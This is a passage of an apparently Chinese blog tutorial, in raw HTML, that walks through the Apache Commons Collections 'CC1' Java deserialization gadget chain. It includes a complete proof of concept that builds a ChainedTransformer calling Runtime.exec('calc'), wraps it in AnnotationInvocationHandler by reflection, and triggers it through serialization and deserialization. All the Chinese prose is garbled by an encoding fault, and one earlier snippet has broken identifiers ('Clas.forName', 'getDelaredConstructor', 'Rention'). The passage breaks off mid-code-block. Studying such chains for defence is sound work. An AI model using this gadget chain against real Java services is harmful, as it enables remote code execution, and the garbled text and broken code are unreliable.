</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">memberType</span><span class="p">.</span><span class="na">isInstance</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="n">value</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">ExceptionProxy</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">memberValue</span><span class="p">.</span><span class="na">setValue</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">new</span><span class="w"> </span><span class="n">AnnotationTypeMismatchExceptionProxy</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">value</span><span class="p">.</span><span class="na">getClass</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;[&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;]&#34;</span><span class="p">).</span><span class="na">setMember</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="n">annotationType</span><span class="p">.</span><span class="na">members</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">name</span><span class="p">)));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÈáçÁÇπÂÖ≥Ê≥®foreachËØ≠Âè•„ÄÇÂú®ËøôÈáå<code>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</code>Áî®‰∫éÈÅçÂéÜMapÔºåÂèØ‰ª•ÂèÇËÄÉËøô‰∏™<a class="link" href="https://blog.csdn.net/zuzhiang/article/details/118444885"  target="_blank" rel="noopener"
    >ÊñáÁ´†</a>ÔºåËÄå<code>String name = memberValue.getKey();</code>ËØ≠Âè•Âíå<code>Object value = memberValue.getValue();</code>ËØ≠Âè•Áî®‰∫éËé∑ÂèñÈîÆÂÄºÂØπ„ÄÇ</p>
<p><img src="/p/cc1/image-20240721143009475.png"
	width="732"
	height="127"
	srcset="/p/cc1/image-20240721143009475_hu12979677060316737425.png 480w, /p/cc1/image-20240721143009475_hu2726474429560339948.png 1024w"
	loading="lazy"
	
		alt="image-20240721143009475"
	
	
		class="gallery-image" 
		data-flex-grow="576"
		data-flex-basis="1383px"
	
></p>
<p>ËøôÈáåÁöÑÈáçÁÇπÂ∞±ÊòØËøô‰∏™<code>setValue()</code>ÊñπÊ≥ï‰∫ÜÔºåËøôÈáåÁÆÄÂçïÁªôÂá∫Ëøô‰∏™Ë∞ÉÁî®ÈìæÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AnnotationInvocationHandler#readObject() ==&gt; AbstractInputCheckedMapDecorator$MapEntry#setValue() ==&gt;TransformedMap#checkSetValue
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®TransformedMapËøôÈáåÂ∞±ÂèØ‰ª•ÂêØÂä®ÂâçÈù¢ÊûÑÈÄ†ÁöÑË∞ÉÁî®Èìæ</p>
<p><img src="/p/cc1/image-20240722141710098.png"
	width="523"
	height="81"
	srcset="/p/cc1/image-20240722141710098_hu3935446923511046551.png 480w, /p/cc1/image-20240722141710098_hu6750748251140161319.png 1024w"
	loading="lazy"
	
		alt="image-20240722141710098"
	
	
		class="gallery-image" 
		data-flex-grow="645"
		data-flex-basis="1549px"
	
></p>
<p>ÂêåÊó∂Âú®ËøôÈáåÂèØ‰ª•ÁúãÂá∫ÊòØÂà©Áî®ÁöÑvalueTransformerÔºåÊâÄ‰ª•Âú®Ë∞ÉÁî®decorate()ÊñπÊ≥ïÂàùÂßãÂåñÊó∂Ë¶Å‰∏çÂêå‰∫éÂâçÈù¢ÁöÑÂü∫Êú¨‰ª£Á†ÅÔºåÈúÄË¶ÅÊîπ‰ΩçÁΩÆÔºåÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Map</span><span class="w"> </span><span class="n">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑ÊâçËÉΩ‰øùËØÅÊàêÂäüË∞ÉÁî®„ÄÇÁé∞Âú®Â∞±Âõ¥ÁªïËøôÊù°ÈìæÂ≠êÊù•ËøõË°åÈòêËø∞„ÄÇ</p>
<p>1.<strong>Áé∞Âú®Êù•ÁúãmemberValuesÁöÑËµãÂÄºÁÇπÔºö</strong></p>
<p><img src="/p/cc1/image-20240721143312438.png"
	width="1134"
	height="417"
	srcset="/p/cc1/image-20240721143312438_hu1055547210312144062.png 480w, /p/cc1/image-20240721143312438_hu650226980123656349.png 1024w"
	loading="lazy"
	
		alt="image-20240721143312438"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="652px"
	
></p>
<p>ËøôÈáåÁî±‰∫éAnnotationInvacationHandlerÂ±ûjdkÂÜÖÈÉ®Á±ªÔºåÊó†Ê≥ïÁõ¥Êé•ÂºïÁî®‰∏îË¢´ÂÆû‰æãÂåñÔºåÊâÄ‰ª•Âè™ËÉΩ<strong>Âà©Áî®ÂèçÂ∞Ñ</strong>Ëé∑ÂèñÊûÑÈÄ†ÊñπÊ≥ïÔºåÂ∞Ü‰øÆÈ•∞ËøáÁöÑMapÊ∑ªÂä†ËøõÂéª„ÄÇ</p>
<p>Ê≥®ÊÑèÁúãAnnotationInvacationHandlerÁöÑÊûÑÈÄ†ÊñπÊ≥ïÔºå<strong>ÁÆÄÂçïËØ¥Êòé‰∏Ä‰∏ãÂèÇÊï∞ÈóÆÈ¢ò</strong>Ôºö</p>
<ul>
<li>
<p>ÂØπ‰∫éÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞<code>Class&lt;? extends Annotation&gt; type</code>ÔºåÁÆÄÂçïËØ¥Êòé‰∏Ä‰∏ãÔºöÂΩ¢Â¶Ç**&lt;Ôºü extends Collection&gt;** ËøôÈáå**Ôºü<strong>‰ª£Ë°®‰∏Ä‰∏™Êú™Áü•ÁöÑÁ±ªÂûãÔºå‰ΩÜÊòØÔºåËøô‰∏™Êú™Áü•ÁöÑÁ±ªÂûãÂÆûÈôÖ‰∏äÊòØ</strong>Collection**ÁöÑ‰∏Ä‰∏™Â≠êÁ±ªÔºå<strong>Collection</strong>ÊòØËøô‰∏™ÈÄöÈÖçÁ¨¶ÁöÑ‰∏äÈôê„ÄÇ</p>
</li>
<li>
<p>ÂêåÊó∂ÁúãËøô‰∏™ÊûÑÈÄ†ÊñπÊ≥ïÈáåÈù¢ÁöÑ if ËØ≠Âè•‰ª£Á†ÅÔºåËøôÈáåÂè™Ë¶ÅÊª°Ë∂≥‰ªª‰Ωï‰∏Ä‰∏™Êù°‰ª∂Â∞±‰ºöËøõÂÖ•Âà∞ifËØ≠Âè•ÔºåÂØºËá¥‰∏çËÉΩÊ≠£Â∏∏ËµãÂÄº„ÄÇËøôÈáåÈáçÁÇπÂÖ≥Ê≥®<code>!type.isAnnotation()</code>‰ª£Á†ÅÔºåËøôÈáåÁöÑisAnnotation()ÂáΩÊï∞Â∞±ÊòØÁî®Êù•Âà§Êñ≠<code>Class</code>ÂØπË±°ÊòØÂê¶ÊòØË°®Á§∫‰∏Ä‰∏™Ê≥®Ëß£Á±ªÂûã„ÄÇÊâÄ‰ª•ËøôÈáåÈúÄË¶Å‰∏Ä‰∏™‰º†ÂÖ•‰∏Ä‰∏™Ê≥®Ëß£Á±ªÂûãÁöÑAnnotation„ÄÇ‰πüÂ∞±ÊòØ‰∏ãÂõæ‰∏≠Êúâ@ÁöÑÁ±ªÔºö</p>
</li>
</ul>
<p><img src="/p/cc1/image-20240721163908857.png"
	width="499"
	height="439"
	srcset="/p/cc1/image-20240721163908857_hu3319692493563158487.png 480w, /p/cc1/image-20240721163908857_hu17717093795011831387.png 1024w"
	loading="lazy"
	
		alt="image-20240721163908857"
	
	
		class="gallery-image" 
		data-flex-grow="113"
		data-flex-basis="272px"
	
></p>
<p>ÈÄâÊã©‰∏äÈù¢ÁöÑ‰ªªÊÑè‰∏Ä‰∏™Ê≥®Ëß£Á±ªÂûãÁöÑÁ±ªÂ∫îËØ•ÈÉΩÊòØÂèØ‰ª•ÁöÑ</p>
<p>ÊâÄ‰ª•ÂèØ‰ª•ÊûÑÈÄ†‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Clas</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDelaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Rention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">ctf</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//ctfÂç≥ÊûÑÈÄ†Â•ΩÁöÑTransformedMap</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Áé∞Âú®Ëß£ÂÜ≥‰∫ÜmemberValuesÂÄºÁöÑÈóÆÈ¢ò„ÄÇ</p>
<p>2.<strong>ÁªßÁª≠ÁúãreadObject()ÊñπÊ≥ïÁöÑÊ∫êÁ†Å</strong></p>
<p>‰∏∫‰∫ÜÊñπ‰æøÂ≠¶‰π†ÔºåÊàë‰ª¨Â∞ùËØïÁõ¥Êé•ÊãºÊé•‰∏Ä‰∏ãÂâçÈù¢ÁöÑÊÄªÁªìÂá∫Êù•ÁöÑ‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Runtime</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Class</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">                                                             </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">map2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Â∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ÂèçÂ∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÜçÊâìÊñ≠ÁÇπË∞ÉËØïÂèëÁé∞ÊòØÂú®readObject()Âú∞ÊñπÂá∫Áé∞ÈóÆÈ¢òÔºåÁé∞Âú®Êù•Ë∑ü‰∏Ä‰∏ãreadObject()ÁöÑÊ∫êÁ†ÅÔºåÊâìÊñ≠ÁÇπÂ¶Ç‰∏ãÔºö</p>
<p><img src="/p/cc1/image-20240722153629967.png"
	width="897"
	height="97"
	srcset="/p/cc1/image-20240722153629967_hu10011241273364891343.png 480w, /p/cc1/image-20240722153629967_hu6919966077226789323.png 1024w"
	loading="lazy"
	
		alt="image-20240722153629967"
	
	
		class="gallery-image" 
		data-flex-grow="924"
		data-flex-basis="2219px"
	
></p>
<p>ÂÖàÊù•ÁúãËøô‰∏§‰∏≤‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">annotationType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AnnotationType</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="n">type</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Âíå</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;&gt;</span><span class="w"> </span><span class="n">memberTypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">annotationType</span><span class="p">.</span><span class="na">memberTypes</span><span class="p">();</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÆÄÂçïÁúãÁúãÁªìÊûúÔºö</p>
<p><img src="/p/cc1/image-20240722155024311.png"
	width="738"
	height="193"
	srcset="/p/cc1/image-20240722155024311_hu4162205107105386321.png 480w, /p/cc1/image-20240722155024311_hu14353888352824899431.png 1024w"
	loading="lazy"
	
		alt="image-20240722155024311"
	
	
		class="gallery-image" 
		data-flex-grow="382"
		data-flex-basis="917px"
	
></p>
<p>Á¨¨‰∏ÄË°å‰ª£Á†ÅÂ∞ÜannotationTypeË¢´ËµãÂÄº‰∏∫‰∫ÜAnnotationTypeÂÆû‰æãÔºåÊâÄ‰ª•Á¨¨‰∫åË°å‰ª£Á†ÅÂ∞±‰ºöË∞ÉÁî®AnnotationTypeÁ±ªÁöÑmemberTypes()ÊñπÊ≥ï:</p>
<p><img src="/p/cc1/image-20240722155410345.png"
	width="499"
	height="95"
	srcset="/p/cc1/image-20240722155410345_hu13160448035252353238.png 480w, /p/cc1/image-20240722155410345_hu7091834830220686760.png 1024w"
	loading="lazy"
	
		alt="image-20240722155410345"
	
	
		class="gallery-image" 
		data-flex-grow="525"
		data-flex-basis="1260px"
	
></p>
<p>ÊâÄ‰ª•ÊúÄÁªàreadObject()ÊñπÊ≥ïÈáåÈù¢ÁöÑmemberTypes‰∏∫HashMapÁ±ªÁöÑÂÆû‰æã„ÄÇ</p>
<p><strong>ËøôÈáåËøòË¶ÅËØ¥Êòé‰∏Ä‰∏™ÁÇπ</strong>ÔºåÂÖ≥‰∫é<code>for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())</code>Ëøô‰∏™Âæ™ÁéØÈÅçÂéÜÁöÑ‰ª£Á†ÅÈóÆÈ¢òÔºåÂú®ÊâìÊñ≠ÁÇπËøáÁ®ã‰∏≠ÔºåÊàëÂèëÁé∞Â¶Ç‰∏ãÊâìÊñ≠ÁÇπ‰ºöÁõ¥Êé•ÁªìÊùüÔºö</p>
<p><img src="/p/cc1/image-20240722155836575.png"
	width="673"
	height="53"
	srcset="/p/cc1/image-20240722155836575_hu3293052599258755410.png 480w, /p/cc1/image-20240722155836575_hu6168086040143855831.png 1024w"
	loading="lazy"
	
		alt="image-20240722155836575"
	
	
		class="gallery-image" 
		data-flex-grow="1269"
		data-flex-basis="3047px"
	
></p>
<p>ÈÇ£Â∞±ËØ¥ÊòéÂú®Êàë‰∏äÈù¢ÊãºÊé•ÁöÑ‰ª£Á†ÅÂú®ÂèçÂ∫èÁöÑÊó∂ÂÄôÂπ∂Ê≤°ÊúâÊàêÂäüËøõÂÖ•Âà∞Ëøô‰∏™forËØ≠Âè•‰∏≠ÔºåÊàëÁåúÊµãÊòØËøô‰∏™Âæ™ÁéØÈÅçÂéÜÁöÑÈóÆÈ¢òÔºåÂéªÊü•ÁúãÂâçÈù¢ÁªôÁöÑÊñáÁ´†ÁöÑ‰∏æ‰æã‰ª£Á†ÅÔºåÁõ¥Êé•ÁúãÊµãËØï‰ª£Á†ÅÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
